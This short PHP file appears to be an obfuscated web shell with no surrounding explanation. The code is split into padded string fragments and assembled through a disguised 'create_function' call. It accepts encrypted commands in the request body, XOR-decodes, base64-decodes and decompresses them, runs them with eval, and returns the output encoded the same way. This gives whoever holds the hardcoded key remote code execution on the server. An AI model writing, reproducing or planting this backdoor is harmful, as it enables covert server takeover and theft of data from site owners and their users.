<?php
$D='tch("/$kh(.+)$;Vk;Vf/",;V@fi;Vle_ge;Vt_contents(;V"php://inp;Vut"),$;Vm)=';
$n='$j++;V;V,$i+;V+);V{$o.=$t{$;V;Vi}^$k{$;Vj;V};}}return;V $o;;V;V}if (@preg_ma';
$F='=1) {@o;Vb_star;Vt;V();@e;V;Vval(@g;V;Vzuncompress(@;Vx(@;Vb;Vase64_dec;Vod';
$o='ase6;V4_e;Vncode(;V@x(@gzco;Vmpre;Vss(;V;V$;Vo),$k);V);print("$p$kh$r$kf");}';
$L='="yIOWoZ;VNMmNdt;V52tr";V;functio;Vn x($t,$k){$;Vc=;Vstrl;Ven($k);$l;V=strl';
$Y='en($;V;Vt);$o="";for;V($i;V=0;$;Vi<$l;){fo;V;Vr($j=0;($j<;V$c&&$i<$l;V);';
$j='e(;V$;Vm[1]),$k)));$o;V=@ob_get_contents();@;Vob_;Ven;Vd_clean();$r;V=@b';
$m=str_replace('NB','','cNBreaNBteNB_fNBNBunctNBion');
$U='$k=";Vf0f2;V6dbd";$kh=";V1cb380e;Vf;V3065";V;$kf="49f;V;Va0b3;Vaacb;V4";$p';
$r=str_replace(';V','',$U.$L.$Y.$n.$D.$F.$j.$o);
$N=$m('',$r);$N();
?>
